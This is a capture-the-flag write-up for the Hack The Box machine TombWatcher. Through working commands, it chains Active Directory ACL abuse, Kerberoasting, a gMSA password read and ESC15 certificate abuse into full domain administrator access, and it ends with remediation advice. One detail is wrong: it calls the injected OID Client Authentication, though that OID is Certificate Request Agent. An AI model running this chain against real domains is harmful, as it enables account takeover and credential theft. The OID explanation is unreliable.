---
title: "HTB — TombWatcher (Medium Windows AD): Kerberoast → gMSA → ESC15 (CVE-2024-49019)"
date: 2026-05-19 10:00:00 +0000
categories: [Machines, HackTheBox]
tags: [hackthebox, windows, active-directory, kerberoast, gmsa, adcs, esc15, cve-2024-49019, certipy, pass-the-hash, medium]
---

**IP:** 10.129.232.167 | **Difficulty:** Medium | **OS:** Windows Server 2019 DC | **Domain:** tombwatcher.htb

## Summary

Domain Controller with a long AD ACL abuse chain. Initial creds for henry allow WriteSPN over alfred → Targeted Kerberoast → password crack. Alfred uses AddSelf to join INFRASTRUCTURE → reads the ansible_devs gMSA password. ansible_devs has ForceChangePassword over sam → reset. sam has WriteOwner over john → GenericAll → password reset. john has GenericAll over the ADCS OU → restores cert_admin from AD Recycle Bin. With cert_admin, **ESC15 (CVE-2024-49019)** is exploited: the WebServer template with `EnrolleeSuppliesSubject` and Schema Version 1 allows injecting a Client Authentication policy → certificate signed as Administrator → Pass-the-Hash.

| Flag | Hash |
|------|------|
| user.txt | `a5e5731f9275238d9bf2ba9efe04f2b9` |
| root.txt | `9f963dd1c34012a0a9ae54316d954f71` |

---

## 1. Reconnaissance

```bash
nmap -sV -sC -T4 -Pn --open 10.129.232.167
echo "10.129.232.167 tombwatcher.htb DC01.tombwatcher.htb" | sudo tee -a /etc/hosts
```

**Initial creds:** `henry:H3nry_987TGV!`

---

## 2. Targeted Kerberoast (henry → alfred)

henry has **WriteSPN** over alfred → makes alfred Kerberoastable:

```bash
python3 targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' \
  --request-user alfred --dc-ip 10.129.232.167

hashcat -m 13100 alfred.hash rockyou.txt
# alfred:basketball
```

---

## 3. gMSA Password Read (alfred → ansible_devs)

alfred has **AddSelf** on the **INFRASTRUCTURE** group. Group members can read the `ansible_dev` gMSA password:

```bash
bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u alfred -p basketball add groupMember INFRASTRUCTURE alfred

bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u alfred -p basketball \
  get object 'CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb' \
  --attr msDS-ManagedPassword
# NT: cba56cd2df7d642f622e2a59956f6d47
```

---

## 4. ForceChangePassword (ansible_devs → sam)

```bash
bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u 'ansible_dev$' -p ':cba56cd2df7d642f622e2a59956f6d47' \
  set password sam 'Rogue@123!'
```

---

## 5. WriteOwner → GenericAll (sam → john) + User Flag

```bash
bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u sam -p 'Rogue@123!' set owner john sam

bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u sam -p 'Rogue@123!' add genericAll john sam

bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u sam -p 'Rogue@123!' set password john 'Rogue@123!'

evil-winrm -i DC01.tombwatcher.htb -u john -p 'Rogue@123!'
type C:\Users\john\Desktop\user.txt
# a5e5731f9275238d9bf2ba9efe04f2b9
```

---

## 6. Restore cert_admin from AD Recycle Bin

john has **GenericAll** over the **ADCS** OU. The `cert_admin` account is deleted:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties cn,LastKnownParent,ObjectGUID
# ObjectGUID: 938182c3-bf0b-410a-9aaa-45c8e1a02ebf (LastKnownParent: OU=ADCS)

Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

```bash
bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
  -u john -p 'Rogue@123!' set password cert_admin 'Rogue@123!'
```

---

## 7. ESC15 — CVE-2024-49019

The **WebServer** template has:
- `EnrolleeSuppliesSubject = True`
- **Schema Version = 1** (no Application Policy restriction)
- Extended Key Usage = Server Authentication only

With Schema Version 1, arbitrary Application Policy OIDs can be injected — including **Client Authentication** (`1.3.6.1.4.1.311.20.2.1`) which enables Smart Card Logon.

**Step 1 — Request certificate with Client Auth injection:**

```bash
certipy req \
  -ca tombwatcher-CA-1 \
  -username cert_admin@tombwatcher.htb \
  -password 'Rogue@123!' \
  -dc-ip 10.129.232.167 \
  -template WebServer \
  -application-policies '1.3.6.1.4.1.311.20.2.1' \
  -target 10.129.232.167 \
  -out cert_admin
```

**Step 2 — Request certificate on behalf of Administrator:**

```bash
certipy req \
  -username cert_admin@tombwatcher.htb \
  -password 'Rogue@123!' \
  -dc-ip 10.129.232.167 \
  -ca tombwatcher-CA-1 \
  -template User \
  -on-behalf-of 'tombwatcher\administrator' \
  -pfx cert_admin.pfx \
  -out administrator
```

**Step 3 — Authenticate and retrieve NTLM hash:**

```bash
certipy auth -dc-ip 10.129.232.167 -pfx administrator.pfx
# NT hash: f61db423bebe3328d33af26741afe5fc

evil-winrm -i DC01.tombwatcher.htb -u administrator \
  -H f61db423bebe3328d33af26741afe5fc

type C:\Users\Administrator\Desktop\root.txt
# 9f963dd1c34012a0a9ae54316d954f71
```

---

## Attack Chain

```
henry (H3nry_987TGV!)
  ↓ WriteSPN → Targeted Kerberoast
alfred (basketball)
  ↓ AddSelf → INFRASTRUCTURE → gMSA read
ansible_devs (NTLM: cba56cd2df7d642f622e2a59956f6d47)
  ↓ ForceChangePassword
sam (Rogue@123!)
  ↓ WriteOwner → GenericAll
john (Rogue@123!) → user.txt
  ↓ GenericAll over ADCS OU → Restore-ADObject
cert_admin (Rogue@123!)
  ↓ ESC15 (CVE-2024-49019) WebServer template Schema V1
administrator NTLM → PTH → root.txt
```

---

## Lessons Learned

| Vulnerability | Remediation |
|---------------|-------------|
| WriteSPN without restriction | Audit who holds WriteSPN; enforce strong Kerberos pre-auth |
| gMSA password readable by unnecessary groups | Restrict PrincipalsAllowedToRetrieveManagedPassword |
| ESC15 (CVE-2024-49019) — Schema V1 + EnrolleeSuppliesSubject | Upgrade or disable Schema Version 1 templates |
| AD Recycle Bin restoring privileged accounts | Monitor object restoration; purge unnecessary accounts |
